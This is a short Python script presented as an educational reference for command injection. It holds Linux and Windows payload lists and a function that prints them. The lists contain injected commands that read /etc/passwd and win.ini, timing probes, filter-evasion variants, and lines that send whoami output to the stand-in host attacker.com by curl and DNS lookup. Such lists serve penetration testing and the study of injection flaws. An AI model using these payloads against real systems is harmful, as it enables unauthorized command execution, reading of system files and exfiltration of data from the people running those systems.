#!/usr/bin/env python3
"""
Command Injection Payload Reference
-----------------------------------
This script contains common command injection payloads for Linux and Windows.
It is intended for Educational Purposes Only.

Author: Tayyab Akhtar
"""

LINUX_PAYLOADS = [
    "; id", "| id", "&& id", "|| id", "`id`", "$(id)",
    "; cat /etc/passwd", "| cat /etc/passwd", "&& cat /etc/passwd",
    "; sleep 5", "| sleep 5", "; ping -c 3 127.0.0.1",
    "; curl attacker.com/$(whoami)", "; nslookup $(whoami).attacker.com",
    ";cat${IFS}/etc/passwd", "|cat${IFS}/etc/passwd", ";cat%09/etc/passwd",
]

WINDOWS_PAYLOADS = [
    "& whoami", "| whoami", "&& whoami",
    "& dir", "| dir", "&& dir",
    "& type C:\\Windows\\win.ini", "| type C:\\Windows\\win.ini",
    "& ping 127.0.0.1 -n 5",
    "& powershell -c Get-Process",
    "& ty^pe C:\\Windows\\win.ini", "& di^r",
]

def get_payloads(os_type="linux"):
    """Return a list of payloads based on OS type."""
    if os_type.lower() == "linux":
        return LINUX_PAYLOADS
    elif os_type.lower() == "windows":
        return WINDOWS_PAYLOADS
    else:
        raise ValueError("os_type must be 'linux' or 'windows'.")

if __name__ == "__main__":
    print("Command Injection Payload Reference (Educational Only)\n")
    os_choice = input("Choose OS type (linux/windows): ").strip().lower()

    try:
        payloads = get_payloads(os_choice)
        print(f"{os_choice.capitalize()} Payloads:\n")
        for payload in payloads:
            print(f"  {payload}")
    except ValueError as e:
        print(f" Error: {e}")
